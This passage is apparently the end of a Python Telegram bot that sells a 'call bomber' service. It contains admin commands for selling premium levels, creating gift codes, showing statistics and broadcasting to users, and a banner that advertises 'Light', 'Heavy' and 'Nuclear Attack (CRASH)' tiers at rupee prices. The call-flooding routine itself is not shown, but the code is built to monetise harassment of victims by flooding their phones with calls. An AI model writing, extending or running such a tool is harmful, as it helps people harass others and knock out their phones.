        if level_str not in ['level2', 'level3']:
            return admin_bot.reply_to(m, "❌ <b>Invalid level!</b>\n\nUse: level2 or level3")
        
        level = 2 if level_str == 'level2' else 3
        
        uid, u = resolve_user(username)
        if not uid:
            return admin_bot.reply_to(m, f"❌ <b>User {username} not found!</b>")
        
        # Set premium
        expiry = datetime.now() + timedelta(days=10)
        u["level"] = level
        u["exp"] = expiry.isoformat()
        users[str(uid)] = u
        save_all()
        
        price = "₹499" if level == 2 else "₹999"
        
        admin_bot.reply_to(
            m,
            f"✅ <b>Premium Unlocked!</b>\n\n"
            f"👤 <b>User:</b> {username}\n"
            f"🎯 <b>Level:</b> {level}\n"
            f"⏱️ <b>Duration:</b> 10 days\n"
            f"📅 <b>Expires:</b> {expiry.date()}\n"
            f"💰 <b>Value:</b> {price}"
        )
        
        try:
            bot.send_message(
                uid,
                f"👑 <b>PREMIUM ACTIVATED!</b>\n\n"
                f"🎯 <b>Level {level} unlocked for 10 days!</b>\n"
                f"💥 Enjoy ultra-powerful bombing! 🔥"
            )
        except:
            pass
    
    except Exception as e:
        admin_bot.reply_to(m, f"❌ <b>Error:</b> {e}\n\n<b>Usage:</b> /unlock @user level2")

@admin_bot.message_handler(commands=["creategift"])
def admin_gift(m):
    """Create gift code"""
    if m.from_user.id != OWNER:
        return
    
    try:
        parts = m.text.split()
        if len(parts) != 3:
            return admin_bot.reply_to(m, "❌ <b>Usage:</b> /creategift 10 5")
        
        credits = int(parts[1])
        max_uses = int(parts[2])
        
        # Generate code
        code = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=8))
        
        codes[code] = {
            "cr": credits,
            "max": max_uses,
            "used": []
        }
        save_all()
        
        admin_bot.reply_to(
            m,
            f"✅ <b>Gift Code Created!</b>\n\n"
            f"🎁 <b>Code:</b> <code>{code}</code>\n"
            f"💰 <b>Credits:</b> {credits}\n"
            f"👥 <b>Max Uses:</b> {max_uses}"
        )
    
    except Exception as e:
        admin_bot.reply_to(m, f"❌ <b>Error:</b> {e}\n\n<b>Usage:</b> /creategift 10 5")

@admin_bot.message_handler(commands=["listgifts"])
def admin_list(m):
    """List gift codes"""
    if m.from_user.id != OWNER:
        return
    
    if not codes:
        return admin_bot.reply_to(m, "📋 <b>No gift codes yet!</b>")
    
    msg = "🎁 <b>Gift Codes:</b>\n\n"
    for code, c in codes.items():
        used = len(c.get("used", []))
        max_uses = c["max"]
        status = "✅" if used < max_uses else "❌"
        msg += f"{status} <code>{code}</code> - {c['cr']}cr ({used}/{max_uses})\n"
    
    admin_bot.reply_to(m, msg)

@admin_bot.message_handler(commands=["deletegift"])
def admin_del(m):
    """Delete gift code"""
    if m.from_user.id != OWNER:
        return
    
    try:
        code = m.text.split()[1].upper()
        
        if code in codes:
            del codes[code]
            save_all()
            admin_bot.reply_to(m, f"✅ <b>Deleted code:</b> {code}")
        else:
            admin_bot.reply_to(m, "❌ <b>Code not found!</b>")
    
    except:
        admin_bot.reply_to(m, "❌ <b>Usage:</b> /deletegift CODE")

@admin_bot.message_handler(commands=["stats"])
def admin_stats(m):
    """Bot stats"""
    if m.from_user.id != OWNER:
        return
    
    total_users = len(users)
    premium_users = sum(1 for uid in users if get_level(int(uid)) > 1)
    total_credits = sum(u.get("cr", 0) for u in users.values())
    active_sess = sum(1 for s in sessions.values() if s.get("active"))
    
    admin_bot.reply_to(
        m,
        f"📊 <b>Bot Statistics</b>\n\n"
        f"👥 <b>Total Users:</b> {total_users}\n"
        f"👑 <b>Premium Users:</b> {premium_users}\n"
        f"💰 <b>Total Credits:</b> {total_credits}\n"
        f"🔥 <b>Active Sessions:</b> {active_sess}\n"
        f"🎁 <b>Gift Codes:</b> {len(codes)}"
    )

@admin_bot.message_handler(commands=["broadcast"])
def admin_bc(m):
    """Broadcast message"""
    if m.from_user.id != OWNER:
        return
    
    try:
        msg = m.text.replace("/broadcast ", "", 1)
        if not msg:
            return admin_bot.reply_to(m, "❌ <b>Usage:</b> /broadcast message")
        
        success = 0
        failed = 0
        
        for uid in users:
            try:
                bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}")
                success += 1
                time.sleep(0.05)
            except:
                failed += 1
        
        admin_bot.reply_to(m, f"✅ <b>Broadcast completed!</b>\n\n📤 Success: {success}\n❌ Failed: {failed}")
    
    except Exception as e:
        admin_bot.reply_to(m, f"❌ <b>Error:</b> {e}")

# ============================================================================
# RUNNER
# ============================================================================

def run_main_bot():
    """Run main bot"""
    while True:
        try:
            logger.info("🤖 Starting main bot...")
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Main bot error: {e}")
            time.sleep(5)

def run_admin_bot():
    """Run admin bot"""
    while True:
        try:
            logger.info("⚙️ Starting admin bot...")
            admin_bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            logger.error(f"Admin bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    print("\n" + "="*60)
    print("╔════════════════════════════════════════════════════════╗")
    print("║                                                        ║")
    print("║       🔥 ULTIMATE CALL BOMBER - FIXED VERSION 🔥      ║")
    print("║                                                        ║")
    print("║  Level 1: Light Attack (Halka lag) - FREE             ║")
    print("║  Level 2: Heavy Attack (Bahut lag) - ₹499             ║")
    print("║  Level 3: Nuclear Attack (CRASH) - ₹999               ║")
    print("║                                                        ║")
    print("╚════════════════════════════════════════════════════════╝")
    print("="*60)
    
    logger.info(f"👑 Owner: {OWNER}")
    logger.info(f"📞 Contact: {OWNER_UN}")
    logger.info(f"🎯 APIs: {len(CALL_APIS)}")
    
    # Start both bots
    main_thread = threading.Thread(target=run_main_bot, daemon=True)
    admin_thread = threading.Thread(target=run_admin_bot, daemon=True)
    
    main_thread.start()
    admin_thread.start()
    
    logger.info("✅ Both bots started successfully!")
    print("\n" + "="*60)
    print("✅ BOTS ARE RUNNING!")
    print("🛑 Press Ctrl+C to stop")
    print("="*60 + "\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("⚠️ Shutting down...")
        print("\n👋 Bots stopped!")
